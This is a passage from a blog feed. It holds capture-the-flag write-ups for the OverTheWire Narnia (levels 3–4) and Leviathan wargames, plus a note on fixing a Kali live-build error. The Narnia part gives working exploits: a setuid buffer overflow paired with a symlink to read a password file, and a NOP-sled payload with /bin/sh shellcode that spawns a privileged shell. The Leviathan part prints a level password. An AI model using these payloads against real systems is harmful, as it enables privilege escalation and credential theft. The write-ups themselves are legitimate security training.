        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
                &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;usage, %s file, will send contents of file 2 /dev/null&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
                &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;

        &lt;span class="cm"&gt;/* open files */&lt;/span&gt;
        &lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ifile&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ofd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ofile&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;O_RDWR&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="p"&gt;){&lt;/span&gt;
                &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;error opening %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ofile&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ifd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ifile&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;O_RDONLY&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="p"&gt;){&lt;/span&gt;
                &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;error opening %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ifile&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;

        &lt;span class="cm"&gt;/* copy from file1 to file2 */&lt;/span&gt;
        &lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ifd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ofd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;copied contents of %s to a safer place... (%s)&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;ifile&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;ofile&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="cm"&gt;/* close 'em */&lt;/span&gt;
        &lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ifd&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ofd&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;At first glance this looks a bit more complicated. However it is just another
buffer overflow (line 13 and 22). This time however we don't control the stack,
we control where the file gets written to. &lt;code&gt;/dev/null&lt;/code&gt; is not a useful place
for data, and we want the contents of &lt;code&gt;/etc/narnia_pass/narnia4&lt;/code&gt;. As &lt;code&gt;narnia3&lt;/code&gt; runs
setuid narnia4, it can do that for us.&lt;/p&gt;
&lt;p&gt;First we determine that we need 32 characters to overflow the buffer. Then anything
beyond that will get written to the ofile. So the plan is to to create a symlink to
&lt;code&gt;narnia4&lt;/code&gt; that is 32 characters long, and then write that to the target. The issue here
is that the source path's last 16 characters need to be the same as the target.
So to do this I created the following directory and symlink:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;narnia3&amp;#64;melinda:/narnia$&lt;/span&gt; mkdir -p /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp
&lt;span class="gp"&gt;narnia3&amp;#64;melinda:/narnia$&lt;/span&gt; ln -s /etc/narnia_pass/narnia4 /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4
&lt;/pre&gt;
&lt;p&gt;Now when we pass that to &lt;code&gt;narnia3&lt;/code&gt;:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;narnia3&amp;#64;melinda:/narnia$&lt;/span&gt; ./narnia3 &lt;span class="sb"&gt;`&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print '/tmp/' + 'x'*27 + '/tmp/narn4'&amp;quot;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;
&lt;span class="go"&gt;copied contents of /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4 to a safer place... (/tmp/narn4)
&lt;/span&gt;&lt;span class="gp"&gt;narnia3&amp;#64;melinda:/narnia$&lt;/span&gt; cat /tmp/narn4
&lt;span class="go"&gt;[password]&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;It's a little odd, but I hope you understand what happened. The last part of the
first path has to be a valid path, so that it can be written to. That's why we have
the double &lt;code&gt;/tmp&lt;/code&gt; setup.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-04"&gt;
&lt;h2&gt;Level 04&lt;/h2&gt;
&lt;pre class="code c literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;ctype.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="k"&gt;extern&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
        &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

        &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="n"&gt;memset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="sc"&gt;'\0'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]));&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;

        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;MOAR OVERFLOWS. This time you'll notice something at line 6. What this does
is &lt;a class="reference external" href="http://man7.org/linux/man-pages/man7/environ.7.html"&gt;store the user environment&lt;/a&gt;.
This then get zerod out inside &lt;code&gt;main&lt;/code&gt; to prevent us from storing any shellcode
in environment variables. However we might still be able to write &lt;code&gt;EIP&lt;/code&gt;, so using the
trusty pattern generator from before&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;local $] ./pattern.py 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7
Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5
Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3
Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9&lt;/span&gt;
&lt;/pre&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;narnia4&amp;#64;melinda:/narnia$&lt;/span&gt; gdb -q ./narnia4
&lt;span class="go"&gt;Reading symbols from ./narnia4...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4
Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3
Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
Starting program: /games/narnia/narnia4 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5
Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4
Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3
Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Program received signal SIGSEGV, Segmentation fault.
0x316a4130 in ?? ()&lt;/span&gt;
&lt;/pre&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;local $] ./pattern.py 0x316a4130
Pattern 0x316a4130 first occurrence at position 272 in pattern.&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;This tells us we have 272 bytes to play with. Plenty of space to construct
a nopsled and shellcode payload. Let's find out what we need to write into
&lt;code&gt;EIP&lt;/code&gt;.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;(gdb) r $(python -c &amp;quot;print 'a'*272 + 'bbbb'&amp;quot;)
Starting program: /games/narnia/narnia4 $(python -c &amp;quot;print 'a'*272 + 'bbbb'&amp;quot;)

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) x/200x $esp
0xffffd5c0:     0x00000000      0xffffd654      0xffffd660      0xf7feacea
0xffffd5d0:     0x00000002      0xffffd654      0xffffd5f4      0x080497cc
0xffffd5e0:     0x0804825c      0xf7fca000      0x00000000      0x00000000
0xffffd5f0:     0x00000000      0x7cc8a421      0x44f76031      0x00000000
0xffffd600:     0x00000000      0x00000000      0x00000002      0x080483b0
0xffffd610:     0x00000000      0xf7ff0500      0xf7e3c979      0xf7ffd000
0xffffd620:     0x00000002      0x080483b0      0x00000000      0x080483d1
0xffffd630:     0x080484ad      0x00000002      0xffffd654      0x08048550
0xffffd640:     0x080485c0      0xf7feb180      0xffffd64c      0x0000001c
0xffffd650:     0x00000002      0xffffd78f      0xffffd7a5      0x00000000
0xffffd660:     0xffffd8ba      0xffffd8ce      0xffffd8de      0xffffd8f1
0xffffd670:     0xffffd914      0xffffd927      0xffffd930      0xffffd93d
0xffffd680:     0xffffde5e      0xffffde69      0xffffde75      0xffffded3
0xffffd690:     0xffffdeea      0xffffdef9      0xffffdf05      0xffffdf16
0xffffd6a0:     0xffffdf1f      0xffffdf32      0xffffdf3a      0xffffdf4a
0xffffd6b0:     0xffffdf80      0xffffdfa0      0xffffdfc0      0x00000000
0xffffd6c0:     0x00000020      0xf7fdbb60      0x00000021      0xf7fdb000
0xffffd6d0:     0x00000010      0x1f898b75      0x00000006      0x00001000
0xffffd6e0:     0x00000011      0x00000064      0x00000003      0x08048034
0xffffd6f0:     0x00000004      0x00000020      0x00000005      0x00000008
0xffffd700:     0x00000007      0xf7fdc000      0x00000008      0x00000000
0xffffd710:     0x00000009      0x080483b0      0x0000000b      0x000036b4
0xffffd720:     0x0000000c      0x000036b4      0x0000000d      0x000036b4
0xffffd730:     0x0000000e      0x000036b4      0x00000017      0x00000000
0xffffd740:     0x00000019      0xffffd76b      0x0000001f      0xffffdfe2
0xffffd750:     0x0000000f      0xffffd77b      0x00000000      0x00000000
0xffffd760:     0x00000000      0x00000000      0x9e000000      0x9213cb6c
0xffffd770:     0x8eef41b1      0xe0574cc7      0x69a73659      0x00363836
0xffffd780:     0x00000000      0x00000000      0x00000000      0x2f000000
0xffffd790:     0x656d6167      0x616e2f73      0x61696e72      0x72616e2f
0xffffd7a0:     0x3461696e      0x61616100      0x61616161      0x61616161
0xffffd7b0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd7c0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd7d0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd7e0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd7f0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd800:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd810:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd820:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd830:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd840:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd850:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd860:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd870:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd880:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd890:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd8a0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd8b0:     0x61616161      0x62626261      0x00000062      0x00000000
0xffffd8c0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd8d0:     0x00000000      0x00000000      0x00000000      0x00000000&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Our input starts at around &lt;em&gt;0xffffd7a8&lt;/em&gt; so let's get going writing our payload.
Create a nopsled that is &lt;em&gt;272 - 25&lt;/em&gt; bytes long, follow that with the
the same shellcode as before, and finish with an address that sits comfortably
in the sled. You normally need to play with the address a bit, as the offsets
inside &lt;em&gt;gdb&lt;/em&gt; are a bit different.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;narnia4&amp;#64;melinda:/narnia$&lt;/span&gt; ./narnia4 &lt;span class="sb"&gt;`&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print '\x90'*(272-25) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + '\x30\xd8\xff\xff'&amp;quot;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; whoami
&lt;span class="go"&gt;narnia5
&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat /etc/narnia_pass/narnia5
&lt;span class="go"&gt;[password]&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
</summary></entry><entry><title>Fix Kali Live Build error</title><link href="http://unlogic.co.uk/2015/03/25/fix-kali-live-build-error/" rel="alternate"></link><updated>2015-03-25T06:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-03-25:2015/03/25/fix-kali-live-build-error/</id><summary type="html">&lt;p&gt;I was trying out the Kali Linux live build, and ran into an an issue where
the &lt;code&gt;lb build&lt;/code&gt; command would throw an error: &lt;code&gt;chroot: failed to run command '/usr/bin/env': No such file or directory&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Turns out this is a Debian bug that's been around since 2013. Luckily the fix
is straightforward. First follow the usual &lt;a class="reference external" href="http://docs.kali.org/development/live-build-a-custom-kali-iso"&gt;live build instructions&lt;/a&gt;
and then make sure the &lt;a class="reference external" href="http://docs.kali.org/general-use/kali-linux-sources-list-repositories"&gt;Kali repo sources are set&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Now in order to fix the issue we follow the instructions provided in
&lt;a class="reference external" href="https://bugs.kali.org/view.php?id=270"&gt;this bug report&lt;/a&gt;. I'll write it down here,
in case I need to refer back to it later. I've also updated the version of
the &lt;code&gt;libdebian-installer&lt;/code&gt; package to the latest available at this time.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;apt-get remove --purge libdebian-installer4
wget http://ftp.debian.org/debian/pool/main/libd/libdebian-installer/libdebian-installer_0.99.tar.xz
tar xvf libdebian-installer_0.99.tar.xz
cd libdebian-installer-0.99
grep -R parser_rfc822 src
apt-get install automake libtool
autoreconf -i -v
./configure
make
make install
git clone git://git.kali.org/live-build-config.git
cd live-build-config/
lb config
lb build&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;After this the build ran fine.&lt;/p&gt;
</summary></entry><entry><title>Solving Leviathan</title><link href="http://unlogic.co.uk/2015/03/23/solving-leviathan/" rel="alternate"></link><updated>2015-03-23T21:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-03-23:2015/03/23/solving-leviathan/</id><summary type="html">&lt;p&gt;After having done &lt;a class="reference external" href="http://overthewire.org/wargames/bandit/"&gt;Bandit&lt;/a&gt;, let's move
on to &lt;a class="reference external" href="http://overthewire.org/wargames/leviathan/"&gt;Leviathan&lt;/a&gt;. None of the levels
have hints, so there won't be any links to each of the levels.&lt;/p&gt;
&lt;p&gt;Without further ado, let's get cracking.&lt;/p&gt;
&lt;div class="section" id="level-0-1"&gt;
&lt;h2&gt;Level 0 -&amp;gt; 1&lt;/h2&gt;
&lt;p&gt;Logging in with &lt;code&gt;leviathan0:leviathan0&lt;/code&gt; we take a quick look around to see
what we have to work with, if anything&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;leviathan0&amp;#64;melinda:~$&lt;/span&gt; ls -la
&lt;span class="go"&gt;total 24
drwxr-xr-x   3 root       root       4096 Nov 14 10:32 .
drwxr-xr-x 167 root       root       4096 Mar 21 06:46 ..
drwxr-x---   2 leviathan1 leviathan0 4096 Feb 10 18:08 .backup
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Let's take a look in that &lt;code&gt;.backup&lt;/code&gt; folder.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;leviathan0&amp;#64;melinda:~$&lt;/span&gt; ls .backup/
&lt;span class="go"&gt;bookmarks.html&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Checking the contents of the file, we see it really is a list of bookmarks.
Going on the assumption that the password for the next level is in there, let's
grep for &lt;em&gt;leviathan&lt;/em&gt; in this file&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;leviathan0&amp;#64;melinda:~$&lt;/span&gt; grep leviathan .backup/bookmarks.html
&lt;span class="go"&gt;&amp;lt;DT&amp;gt;&amp;lt;A HREF=&amp;quot;http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m&amp;quot; ADD_DATE=&amp;quot;1155384634&amp;quot; LAST_CHARSET=&amp;quot;ISO-8859-1&amp;quot; ID=&amp;quot;rdf:#$2wIU71&amp;quot;&amp;gt;password to leviathan1&amp;lt;/A&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;And there it is&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-1-2"&gt;
&lt;h2&gt;Level 1 -&amp;gt; 2&lt;/h2&gt;
&lt;p&gt;As usual we login, do a &lt;code&gt;ls -la&lt;/code&gt; and see a &lt;code&gt;check&lt;/code&gt; binary that is setuid &lt;code&gt;leviathan2&lt;/code&gt;.
Let's run it and see what happens&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;leviathan1&amp;#64;melinda:~$&lt;/span&gt; ./check
&lt;span class="go"&gt;password: test
Wrong password, Good Bye ...&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Trying the usual &lt;code&gt;strings check&lt;/code&gt; shows us a couple of interesting strings: &lt;code&gt;secret&lt;/code&gt; and &lt;code&gt;love&lt;/code&gt;.
Neither one or both will return success. Hrmm. Ok, let's take a look at the
disassembly&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;(gdb) disass main
Dump of assembler code for function main:
   0x0804852d &amp;lt;+0&amp;gt;:     push   %ebp
   0x0804852e &amp;lt;+1&amp;gt;:     mov    %esp,%ebp
   0x08048530 &amp;lt;+3&amp;gt;:     and    $0xfffffff0,%esp
   0x08048533 &amp;lt;+6&amp;gt;:     sub    $0x30,%esp
   0x08048536 &amp;lt;+9&amp;gt;:     mov    %gs:0x14,%eax
   0x0804853c &amp;lt;+15&amp;gt;:    mov    %eax,0x2c(%esp)
   0x08048540 &amp;lt;+19&amp;gt;:    xor    %eax,%eax
   0x08048542 &amp;lt;+21&amp;gt;:    movl   $0x786573,0x18(%esp)
   0x0804854a &amp;lt;+29&amp;gt;:    movl   $0x72636573,0x25(%esp)
   0x08048552 &amp;lt;+37&amp;gt;:    movw   $0x7465,0x29(%esp)
   0x08048559 &amp;lt;+44&amp;gt;:    movb   $0x0,0x2b(%esp)
   0x0804855e &amp;lt;+49&amp;gt;:    movl   $0x646f67,0x1c(%esp)
   0x08048566 &amp;lt;+57&amp;gt;:    movl   $0x65766f6c,0x20(%esp)
   0x0804856e &amp;lt;+65&amp;gt;:    movb   $0x0,0x24(%esp)
   0x08048573 &amp;lt;+70&amp;gt;:    movl   $0x8048680,(%esp)
   0x0804857a &amp;lt;+77&amp;gt;:    call   0x80483c0 &amp;lt;printf&amp;#64;plt&amp;gt;
   0x0804857f &amp;lt;+82&amp;gt;:    call   0x80483d0 &amp;lt;getchar&amp;#64;plt&amp;gt;
   0x08048584 &amp;lt;+87&amp;gt;:    mov    %al,0x14(%esp)
   0x08048588 &amp;lt;+91&amp;gt;:    call   0x80483d0 &amp;lt;getchar&amp;#64;plt&amp;gt;
   0x0804858d &amp;lt;+96&amp;gt;:    mov    %al,0x15(%esp)
   0x08048591 &amp;lt;+100&amp;gt;:   call   0x80483d0 &amp;lt;getchar&amp;#64;plt&amp;gt;
   0x08048596 &amp;lt;+105&amp;gt;:   mov    %al,0x16(%esp)
